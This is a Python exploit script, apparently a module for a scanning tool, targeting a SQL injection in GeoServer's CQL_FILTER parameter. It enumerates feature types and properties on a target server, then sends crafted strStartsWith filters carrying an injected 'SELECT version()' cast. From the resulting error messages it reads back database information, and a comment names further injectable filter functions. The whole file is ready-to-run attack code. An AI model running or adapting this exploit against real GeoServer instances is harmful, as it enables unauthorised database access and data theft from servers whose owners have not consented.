#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import xml.etree.ElementTree as ET
import json
import urllib3

urllib3.disable_warnings()
class Cve_2023_25157:
    def main(self,target):
        # Colored output codes
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        ENDC = '\033[0m'
        # URL and proxy settings
        URL = target['url'].strip("/ ")
        PROXY_ENABLED = target["proxy"]
        PROXY = f"http://{PROXY_ENABLED}" if PROXY_ENABLED else None

        response = requests.get(URL + "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities",
                                proxies={"http": PROXY}, verify=False)

        if response.status_code == 200:

            # Parse the XML response and extract the Name from each FeatureType and store in a list
            root = ET.fromstring(response.text)
            feature_types = root.findall('.//{http://www.opengis.net/wfs}FeatureType')
            names = [feature_type.findtext('{http://www.opengis.net/wfs}Name') for feature_type in feature_types]

            # Print the feature names
            print(f"{GREEN}Available feature names:{ENDC}")
            for name in names:
                print(f"- {name}")

            # Send requests for each feature name and CQL_FILTER type
            cql_filters = [
                "strStartsWith"]  # We can also exploit other filter/functions like "PropertyIsLike", "strEndsWith", "strStartsWith", "FeatureId", "jsonArrayContains", "DWithin" etc.
            for name in names:
                for cql_filter in cql_filters:
                    endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&maxFeatures=1&outputFormat=json"
                    response = requests.get(URL + endpoint, proxies={"http": PROXY}, verify=False)
                    if response.status_code == 200:
                        json_data = json.loads(response.text)
                        properties = json_data['features'][0]['properties']
                        property_names = list(properties.keys())
                        print(f"\n{GREEN}Available Properties for {name}:{ENDC}")
                        for property_name in property_names:
                            print(f"- {property_name}")

                        print(f"\n{YELLOW}Sending requests for each property name:{ENDC}")
                        for property_name in property_names:
                            endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&CQL_FILTER={cql_filter}%28{property_name}%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+INTEGER%29%29+--+%27%29+%3D+true"
                            response = requests.get(URL + endpoint, proxies={"http": PROXY}, verify=False)
                            print(
                                f"[+] Sending request for {BOLD}{name}{ENDC} with Property {BOLD}{property_name}{ENDC} and CQL_FILTER: {BOLD}{cql_filter}{ENDC}")
                            if response.status_code == 200:
                                root = ET.fromstring(response.text)
                                error_message = root.findtext('.//{http://www.opengis.net/ogc}ServiceException')
                                print(f"{GREEN}{error_message}{ENDC}")
                            else:
                                print(f"{RED}Request failed{ENDC}")
                    else:
                        print(f"{RED}Request failed{ENDC}")
        else:
            print(f"{RED}Failed to retrieve XML data{ENDC}")